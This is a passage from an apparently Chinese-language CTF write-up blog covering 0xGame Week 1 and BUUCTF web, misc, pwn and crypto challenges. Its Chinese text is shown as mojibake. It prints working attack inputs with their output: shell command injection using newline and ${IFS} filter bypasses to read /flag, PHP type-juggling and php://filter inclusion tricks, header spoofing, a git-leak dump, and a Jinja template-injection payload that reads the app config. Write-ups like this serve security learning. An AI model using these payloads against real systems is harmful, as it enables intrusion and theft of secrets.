<span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">// /è¿‡æ»¤å¯ä»¥ç”¨åå¼•å·å’Œprintfé…åˆç»•è¿‡ï¼š`printf$&#123;IFS&#125;&quot;\57&quot;`</span><br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>); <span class="hljs-comment">//flagè¢«è¿‡æ»¤å¯ä»¥ç”¨é€šé…ç¬¦*ç»•è¿‡ï¼šfl*</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;                      <br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<span class="hljs-comment">//POSTä¼ IP</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>); <span class="hljs-comment">//å¯¹ä¼ è¿‡å»çš„ipè¿›è¡Œè¿‡æ»¤</span><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<span class="hljs-comment">//æ­£åˆ™åŒ¹é…IPv4åœ°å€çš„æ ¼å¼ï¼Œå¯ä»¥ç”¨æ¢è¡Œç¬¦%0aç»•è¿‡</span><br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);  <span class="hljs-comment">//å‘½ä»¤æ‰§è¡Œ</span><br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>å…ˆåˆ©ç”¨lsçœ‹çœ‹å½“å‰ç›®å½•ä¸‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p><code>ip=127.0.0.1%0als</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.php</span><br>index<span class="hljs-selector-class">.html</span><br>simple.css<br></code></pre></td></tr></table></figure><p>å»æ ¹ç›®å½•çœ‹çœ‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>als<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">boot</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">etc</span><br><span class="hljs-attribute">flag</span><br></code></pre></td></tr></table></figure><p>catè¯»&#x2F;flagçš„å†…å®¹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>%<span class="hljs-number">0</span>acat<span class="hljs-variable">$&#123;IFS&#125;</span>`printf<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&quot;\57&quot;</span>`fl*<br></code></pre></td></tr></table></figure><p>flagï¼š0xGame{19c71976-d7d8-4ab8-9ea5-6ea3800f59f6}</p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-comment">//GETä¼ aå’Œb,POSTä¼ c,COOKIEè¶…å…¨å±€å˜é‡ä¸­nameå¯¹åº”$name</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123; <span class="hljs-comment">//md5åŠ å¯†æ•°ç»„ä¼šè¿”å›nullï¼Œnull==nullæˆç«‹</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//cä¸èƒ½æ˜¯ä¸ªæ•°å­—ï¼Œå¯ä»¥åœ¨ä»»æ„æ•°å­—ååŠ ä¸ªå­—æ¯è¾¾åˆ°ç›®çš„</span><br>        &#125;                          <span class="hljs-comment">//cä¸èƒ½ç­‰äº1024ï¼Œç»“åˆåé¢çš„intvalå‡½æ•°æƒ³åˆ°åˆ©ç”¨å°æ•°ç»•è¿‡ï¼Œintvalä¸€ä¸ªå°æ•°å¹¶ä¸ä¼šéµå¾ªå››èˆäº”å…¥åŸåˆ™</span><br>    &#125;                              <span class="hljs-comment">//æç¤ºflagåœ¨flag.phpä¸­ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ã€‚å› ä¸ºåé¢ä¼šåŠ .phpæ‰€ä»¥ç›´æ¥ä¼ flagçœ‹çœ‹æƒ…å†µ</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼š</p><p>GET<code>?a[]=1&amp;b[]=2</code>POST<code>c=1024.9a</code>å¹¶ä¸”<code>Cookie: name=flag</code></p><p>æ²¡ååº”ï¼Œè¯•äº†è¯•ç›®å½•ç©¿è¶Šä¹Ÿæ²¡ç»“æœã€‚æƒ³åˆ°ç”¨ä¼ªåè®®è¯»flag.phpï¼š</p><p><code>Cookie: name=php://filter/convert.base64-encode/resource=flag</code></p><p>å¾—åˆ°ä¸€ä¸²base64:</p><p><code>PD9waHAKCiRmbGFnID0gJzB4R2FtZXs0M2JiM2UyNC0wODI0LTQ4Y2ItOTVkMC1jNDcxNTQwYzA5NTN9JzsKCj8</code></p><p>è§£ä¸ªç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag = 0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;</code></p><h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>ç¬¬ä¸€å…³æç¤ºç”¨<code>Get</code>æ–¹å¼ä¼ <code>query</code>ï¼Œè€Œä¸”å€¼å¿…é¡»æ˜¯<code>ctf</code></p><p><code>?query=ctf</code></p><p>ç¬¬äºŒå…³æç¤ºç”¨<code>POS</code>Tä¼ <code>action</code>,è€Œä¸”å€¼å¿…é¡»æ˜¯<code>getflag</code></p><p><code>action=getflag</code></p><p>ç¬¬ä¸‰å…³æç¤º <code>you are not admin</code>ï¼Œæƒ³åˆ°è¿™ä¸œè¥¿å¯èƒ½åœ¨cookieæ”¾ç€ï¼ŒburpsuiteæŠ“åŒ…ï¼šå‘ç°<code>Cookie: role=guest</code>ï¼Œæ”¹æˆ<code>Cookie: role=admin</code></p><p>ç¬¬å››å…³æç¤º<code>Error: Only allow local IP</code>ï¼Œè¿˜æ˜¯æŠ“åŒ…åŠ ä¸ªXFFå¤´ï¼š</p><p><code>X-Forwarded-For:127.0.0.1</code></p><p>ç¬¬äº”å…³æç¤º<code>Error: You are not using HarmonyOS Browser ğŸ˜¡</code>ï¼Œè¿˜æ˜¯æŠ“åŒ…æ”¹User-Agentï¼š</p><p><code>User-Agent:HarmonyOS Browser</code></p><p>ç¬¬å…­å…³æç¤ºå¿…é¡»æ¥è‡ª<code>ys.mihoyo.com</code>ï¼ŒæŠ“åŒ…æ”¹Refererï¼š</p><p><code>Referer: ys.mihoyo.com</code></p><p>å¾—åˆ°Flag:<code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;</code></p><h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>è¿›ç¯å¢ƒåå‘ç°æ˜¯ä¸ªåšå®¢ä¸»é¡µï¼Œé‡Œé¢æœ‰ä¸ªNoticeåšæ–‡å†™äº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>There is noting here. Using Git for version control</code></p><p>ç»“åˆé¢˜ç›®æƒ³åˆ°å¯èƒ½æ˜¯æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè€Œä¸”è®¿é—®<code>/.git</code>å¹¶æ²¡æœ‰å¼¹404</p><p>ç”¨dirsearchæ‰«äº†ä¸€ä¸‹ï¼Œå‘ç°å¤§é‡.gitæ–‡ä»¶ï¼ŒçŒœæµ‹gitæ³„éœ²ï¼š</p><p><img src="/img/repo1.png" alt="repo1"></p><p>GitHackå¼„å®ƒï¼š</p><p><code>python2 GitHack.py http://120.27.148.152:50013/.git</code></p><p><img src="/img/repo2.png" alt="repo2"></p><p>åœ¨å­˜å‚¨æ‰«æç»“æœçš„æ–‡ä»¶å¤¹åˆ©ç”¨<code>git log</code>æŸ¥çœ‹æ¯ä¸ªcommitéƒ½å¹²äº†å•¥ï¼š</p><p><img src="/img/rerpo3.png" alt="rerpo3"></p><p>çœ‹åˆ°äº†ä¸‰ä¸ªç‰ˆæœ¬ï¼Œå‘ç°æœ‰ä¸ª <code>add post : flag</code></p><p>å¯¹æ¯”ä¸‹ç‰ˆæœ¬æ‹¿flag:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git diff ea44cb8ff3c27bb1db6d3acc4c875144d295045d 8a5b670558921bd232d75b29542492f00698298b<br></code></pre></td></tr></table></figure><p><img src="/img/repo4.png" alt="repo4"></p><p><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;</code></p><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>æ˜æ˜æ˜¯ç­¾åˆ°å´æ˜¯æœ€åä¸€ä¸ªè§£å‡ºæ¥çš„:(è¿æ°”å¥½è¢«æˆ‘ä¹±ç‚¹ç‚¹å‡ºæ¥äº†</p><p><img src="/img/ok1.png" alt="ok1"></p><p><code>flagï¼š0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;</code></p><h1 id="MISCéƒ¨åˆ†"><a href="#MISCéƒ¨åˆ†" class="headerlink" title="MISCéƒ¨åˆ†"></a>MISCéƒ¨åˆ†</h1><h3 id="Week-1-shark-shark"><a href="#Week-1-shark-shark" class="headerlink" title="[Week 1] shark shark"></a>[Week 1] shark shark</h3><p>ç¬¬ä¸€æ¬¡åšæ‚é¡¹çš„é¢˜ :) ä¸‹è½½é™„ä»¶åç”¨wiresharkæ‰“å¼€ï¼Œå‘ç°å¥½åƒæ˜¯ä¸ªç™»å½•è¿‡ç¨‹ï¼Ÿç™»å½•åæ‰§è¡Œäº†ä¸€äº›å‘½ä»¤ ï¼š</p><p><img src="/img/shark.png" alt="shark"></p><p>ç›´æ¥æœ<code>0xGame</code>å’Œ<code>flag</code>éƒ½æ²¡ç»“æœã€‚ã€‚ä½†åœ¨è¿”å›åŒ…é‡Œæœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Ÿ</p><p><img src="/img/shark2.png" alt="shark2"></p><p>æŠŠdataæ‹¿å‡ºæ¥æ‹¿å»é—®äº†CHATGPT:)è¯´è¿™æ˜¯ä¸€ä¸ªZIPæ–‡ä»¶çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œè¦æŠŠå®ƒè§£ç æˆäºŒè¿›åˆ¶æ•°æ®å†è§£å‹ã€‚å‘ç°æœ‰ä¸ª<code>flag.txt</code>æ–‡ä»¶ï¼Œä½†éœ€è¦å¯†ç ï¼š</p><p><img src="/img/shark3.png" alt="shark3"></p><p>æƒ³åˆ°åˆšæ‰è¿½è¸ªæµçš„æ—¶å€™æœ‰ä¸ªvery_safe_passwordï¼Œå°è¯•äº†ä¸€ä¸‹å¾—åˆ°äº†flagï¼š<code>0xGame&#123;7a504dab-ada6-4c41-adb3-0d1530098cd4&#125;</code></p><h3 id="Week-1-hide-and-seek"><a href="#Week-1-hide-and-seek" class="headerlink" title="[Week 1] hide and seek"></a>[Week 1] hide and seek</h3><p>æ ¹æ®é¢˜ç›®æç¤ºå’Œå¸ˆå‚…åœ¨ç¾¤é‡Œçš„æç¤ºï¼Œä¸‹è½½äº†<code>stegseek</code>è¿™ä¸ªå·¥å…·ï¼Œå¼„ä¸€ä¸‹å°±å¾—åˆ°flagäº†ï¼š</p><p><img src="/img/hiideandseek.png" alt="hiideandseek"></p><h3 id="Week-1-least-and-most"><a href="#Week-1-least-and-most" class="headerlink" title="[Week 1] least and most"></a>[Week 1] least and most</h3><p>é¢˜ç›®æç¤ºæ˜¯éšå†™ï¼Œç½‘ä¸Šä¸‹äº†ä¸ªå«<code>stegsolve</code>çš„å·¥å…·ï¼Œä¸€é€šä¹±ç‚¹å¾—åˆ°äº†ï¼š</p><p><code>0xGame&#123;l sb_com</code>å’Œ<code>bined_wi th_msb&#125;</code>ã€‚</p><h3 id="Week-1-signin-1"><a href="#Week-1-signin-1" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p><code>R0I0RU9ZTE5NVjVWT1pMTU1NWUcyWks3S1JYVjZNRFlJNVFXMlpKU0dBWkRHSUpCUFU9PT09PT0=</code></p><p>çœ‹ç€åƒbase64ï¼Œå…ˆè§£ç çœ‹çœ‹å•¥æƒ…å†µï¼š</p><p><code>GB4EOYLNMV5VOZLMMMYG2ZK7KRXV6MDYI5QW2ZJSGAZDGIJBPU======</code></p><p>å†ç”¨base32è§£ä¸€ä¸‹ï¼š</p><p><code>0xGame&#123;Welc0me_To_0xGame2023!!&#125;</code></p><h3 id="Week-1-é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs"><a href="#Week-1-é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs" class="headerlink" title="[Week 1] é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs"></a>[Week 1] é‡ç”Ÿä¹‹æˆ‘åœ¨æ•™å­¦æ¥¼æ‰“cs</h3><p>ä¸‹è½½å‘ç°æ˜¯ä¸ªbspæ–‡ä»¶ï¼Œæ ¹æ®å¸ˆå‚…çš„æç¤ºå‘ç°è¿™ä¸œè¥¿æ˜¯ä¸ªcs1.6çš„åœ°å›¾æ–‡ä»¶ï¼Œé‡å‘½åä¸€ä¸‹æ”¾åˆ°<code>cstrike</code>ä¸‹çš„<code>maps</code>æ–‡ä»¶å¤¹é‡Œï¼Œç„¶åcs1.6ç›´æ¥è¿›åœ°å›¾ã€‚åœ¨é¼å³ä¸‹è§’æ‰¾åˆ°äº†ä¸€ä¸²å°å­—ï¼š</p><p><code>0xGame&#123;CS_very_good&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h3 id="Week-1-æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag"><a href="#Week-1-æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag" class="headerlink" title="[Week 1] æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag"></a>[Week 1] æ‰¾ä¸åˆ°ä¸”ä¸å¯¹åŠ²çš„flag</h3><p><code> nc 8.130.35.16 51000</code>å<code>ls</code>,å‘ç°æœ‰ä¸ª<code>flag</code>ä½†<code>cat</code>è¯»äº†å‘ç°æ˜¯å‡çš„:</p><p><img src="/img/secret.png" alt="secret"></p><p><code>ls -al</code>å‘ç°æœ‰ä¸ª<code>.secret</code>æ–‡ä»¶ï¼Œ<code>cat</code>è¯»äº†ä¸‹å¾—åˆ°äº†<code>flag</code></p><p><img src="/img/pwn1.png" alt="pwn1"></p><h1 id="Cryptoéƒ¨åˆ†"><a href="#Cryptoéƒ¨åˆ†" class="headerlink" title="Cryptoéƒ¨åˆ†"></a>Cryptoéƒ¨åˆ†</h1><h3 id="Week-1-Vigenere"><a href="#Week-1-Vigenere" class="headerlink" title="[Week 1] Vigenere"></a>[Week 1] Vigenere</h3><p>é¢˜ç›®æè¿°ï¼šå¯†æ–‡ï¼š0dGmqk{79ap4i0522g0a67m6i196he52357q60f} å¤è€è€Œç¥ç§˜çš„åŠ å¯†æ–¹å¼ï¼Ÿ</p><p><code>flag</code>æ ¼å¼<code>0xGame&#123;xxxx&#125;</code>ï¼Œç°åœ¨å¼€å¤´æ˜¯<code>0dGmqk</code>ï¼ŒçŒœæµ‹å¯†é’¥å‰å››ä½æ˜¯<code>game</code>?ï¼Œå…ˆåœ¨çº¿è§£å¯†çœ‹ä¸‹ç»“æœï¼š</p><p><img src="/img/vig.png" alt="vig"></p><p>å¾—åˆ°flagã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTFåšé¢˜è®°å½•_1</title>
    <link href="/2023/09/17/helloworld/"/>
    <url>/2023/09/17/helloworld/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a><strong>shrine</strong></h2><p>è¿›å»ç›´æ¥ç»™äº†ä¸€å¤§å¨ä»£ç ï¼Œç®€å•æ‹ä¸€ä¸‹ï¼š<br><img src="/img/c1.png" alt="c1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask <br><span class="hljs-keyword">import</span> os <br>app = flask.Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#å°†FLAGä»ç¯å¢ƒå˜é‡ä¸­å¼¹å‡ºå»ï¼Œå¼¹å‡ºå»çš„FLAGç»™äº†app.configå­—å…¸ä¸­FLAGé”®å¯¹åº”çš„å€¼ï¼Œå¯ä»¥ç”¨config[&#x27;FLAG&#x27;]è®¿é—®å®ƒï¼Œä½†åé¢ä¼šæŠŠconfigè¿™ä¸œè¥¿å½“é»‘åå•è¿‡æ»¤æ‰ã€‚</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>       s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#å·¦æ‹¬å·æ›¿æ¢ä¸ºç©ºï¼Œå³æ‹¬å·æ›¿æ¢ä¸ºç©º</span><br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<span class="hljs-comment">#æŠŠé»‘åå•é‡Œçš„å­—ç¬¦å…¨æ›¿æ¢ä¸ºç©ºï¼Œä¸¤ä¸ª%ç”¨æ¥è½¬ä¹‰ï¼Œå¦åˆ™&#123;&#125;å°±è¢«å½“æˆå ä½ç¬¦äº†ã€‚æ³¨æ„è¿™ä¸ªåªæ›¿æ¢åŒæ‹¬å·é‡Œçš„configå’Œselfï¼Œå•ä¸ªæ‹¬å·æ²¡å•¥å½±å“ã€‚</span><br><br>  <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>çŒœæµ‹SSTIæ¨¡æ¿æ³¨å…¥ï¼Œåœ¨&#x2F;shrine&#x2F;ä¸‹å°è¯•49:<br><img src="/img/c2.png" alt="c2"><br>ä¸ƒä¸ªä¸ƒï¼Œè€Œä¸”ä»£ç é‡Œéƒ½æäº†Jinjaã€‚<br>å¯¹äºè¾“å…¥é¦–å…ˆè¿‡æ»¤äº†()ï¼Œç„¶åè¿‡æ»¤äº†configå’Œselfè¿™ä¸¤ä¸ªå…³é”®å­—ã€‚<br>åˆ©ç”¨<code>/shrine/&#123;&#123;"".__class__.__base__.__base__&#125;&#125;</code>æ‰¾åˆ°äº†å®ƒæœ€å¤§çš„çˆ¹<code>object</code>ï¼Œå†ç”¨subclassesæ‰¾å®ƒä¸‹é¢çš„æ‰€æœ‰å­ç±»ï¼š<br><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()&#125;&#125;</code><br><img src="/img/c3.png" alt="c3"><br>å‡ºäº†ä¸ªè¿™ç§ä¸œè¥¿å°±ä¸ä¼šåšäº†ã€‚æ„Ÿè§‰è‡ªå·±çš„çŸ¥è¯†è¿˜æ˜¯å¤ªè´«ç˜ äº†ï¼Œä¸€çœ‹åˆ°SSTIçš„é¢˜å°±æƒ³ç€åˆ¤æ–­ç±»å‹ç„¶åæ‰¾å®ƒçš„çˆ¹æ‰§è¡Œå‘½ä»¤ï¼Œéƒ½å¿«æˆæ€ç»´å®šå¼äº†ã€‚ã€‚ã€‚è€Œä¸”åšé¢˜ä¹Ÿä¸ç»†å¿ƒï¼Œæ—¢ç„¶å®ƒæŠŠconfigå’Œselfæ”¾åˆ°äº†é»‘åå•é‡Œï¼Œé‚£ä¸ºä»€ä¹ˆååæ”¾å®ƒä¿©å‘¢ï¼Ÿconfigå¯èƒ½æ˜¯å› ä¸ºæŠŠFLAGç›´æ¥å¼¹ç»™äº†å®ƒæ‰€ä»¥è¿‡æ»¤ï¼Œé‚£selfä¸ºä»€ä¹ˆè¿‡æ»¤ï¼Ÿå¸Œæœ›ä»¥ååœ¨å­¦ä¹ è¿‡ç¨‹ä¸­èƒ½å…‹æœè¿™äº›é—®é¢˜ã€‚<br>å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpçœ‹çœ‹å…¶å®ƒå¸ˆå‚…æ˜¯æ€ä¹ˆè§£çš„ï¼Œæ„Ÿè°¢è¿™ä½å¸ˆå‚…ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Cl0ud/</span>p/<span class="hljs-number">12316287</span>.html<br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">93746437</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰é»‘åå•çš„åŒ–ï¼Œç›´æ¥å³å¯è®¿é—®ç¯å¢ƒå˜é‡ä¸­çš„FLAGï¼Œæˆ–è€…ç”¨self.<strong>dict</strong> è®¿é—®ä½†configå’Œselfè¢«é»‘åå•è¿‡æ»¤æ‰äº†ã€‚è¿™æ—¶å¯ä»¥ä½¿ç”¨pythonå†…ç½®å‡½æ•°ï¼š<code>url_foræˆ–è€…get_flashed_messages</code>è¯»å–å…¨å±€å˜é‡<code>current_app</code>ã€‚å†åˆ©ç”¨è¿™ä¸ª<code>current_app</code>è®¿é—®configå­—å…¸ä¸­FLAGé”®å¯¹åº”çš„å€¼ã€‚</p><p>payload:<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a><strong>lottery</strong></h3><p>è¿›ç¯å¢ƒå‘ç°æ˜¯ä¸ªç±»ä¼¼çŒœéª°å­çš„ä¸œè¥¿ï¼šæ³¨å†Œè´¦å·åå»èŠ±é’±çŒœæ•°ï¼ŒçŒœå¯¹äº†ç»™é’±ã€‚å½“å£è¢‹é¥±é¥±ä¹‹åå¯ä»¥ä¹°FLAGï¼š</p><p><img src="/img/lo1.png" alt="lo1"></p><p>é¢˜ç›®ç»™äº†ä¸ªé™„ä»¶ï¼Œçœ‹çœ‹éƒ½æœ‰å•¥ä¸œè¥¿ï¼š</p><p><img src="/img/lo2.png" alt="lo2"></p><p>ç›´æ¥æŠŠæ‰€æœ‰ä»£ç éƒ½ç»™äº†ï¼Ÿå’Œé’±æœ‰å…³çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 